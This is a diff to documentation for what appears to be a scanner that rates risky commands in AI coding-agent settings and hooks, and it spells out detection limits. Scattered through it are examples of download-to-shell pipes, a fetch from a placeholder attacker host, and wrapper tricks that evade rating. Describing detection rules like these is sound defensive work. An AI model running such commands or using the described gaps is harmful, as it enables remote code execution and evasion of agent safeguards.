@@ -821,13 +821,18 @@ A way around a limit that its entry does not describe is worth a
   download run through a wrapper, interpreter or file not listed there, such as
   `curl x | unshare sh` or `curl x | deno run -`, or through a variable that holds the
   command name, is medium, as is a downloader given a host without a scheme or a path,
-  such as `curl evil.example`. The Codex `notify` command and the Gemini CLI tool
+  such as `curl evil.example`. A command given to `su -c` or `script -c` as one quoted
+  string is read as one word, which names a shell but no interpreter, so
+  `su -c 'python3 -'` is medium too, as is a download piped to `su` without `-c`, which runs the
+  user's shell on it. `perl -c` is read as running its program, because it runs BEGIN
+  blocks. PowerShell's `/e` form is checked before `-File` takes its script, so
+  `pwsh -File /e`, a script at the root named `e`, is critical. The Codex `notify` command and the Gemini CLI tool
   discovery and call commands are digested but not rated. Settings `env` is rated by
   the names `settings_environment` lists, never by value, so an endpoint set through
   another variable, or a project tool that reads its own variable, is not reported.
 - **Hook scripts outside the hook directories are not read.** Every file under
-  `.claude/hooks` and `.cursor/hooks` is bound by digest as a skill resource, so a
-  change to one alerts. A hook that runs a script elsewhere in the project, such as
+  `.claude/hooks` and `.cursor/hooks` is bound by digest as a `skill-resource` and
+  checked only for hidden characters, so a change to one alerts. A hook that runs a script elsewhere in the project, such as
   `scripts/fmt.sh`, binds only the program word in the settings digest, so changing
   only that script raises no alert; nor does a change to a file a hook script itself
   runs or sources. Keep hook scripts under those directories.
